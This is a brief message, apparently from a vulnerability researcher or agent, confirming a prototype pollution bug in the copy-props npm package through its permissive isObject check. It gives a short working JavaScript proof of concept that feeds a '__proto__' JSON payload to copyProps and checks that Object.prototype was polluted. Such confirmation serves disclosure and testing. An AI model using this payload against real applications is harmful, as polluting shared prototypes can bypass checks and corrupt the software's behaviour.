Confirmed the prototype pollution works via `isObject`'s permissive check. Here's the exploit:

```javascript
const copyProps = require("copy-props");

// isObject() only checks Object.prototype.toString.call(x) === '[object Object]',
// so a JSON-parsed payload with a "__proto__" key passes as a valid plain object
// and copy-props happily walks into it, polluting Object.prototype.
const maliciousInput = JSON.parse('{"__proto__":{"polluted":"yes"}}');

copyProps(maliciousInput, {});

console.log("Prototype polluted:", ({}).polluted); // -> "yes"

if (({}).polluted === "yes") {
  console.log("Vulnerability confirmed: Object.prototype was polluted via isObject()");
}
```
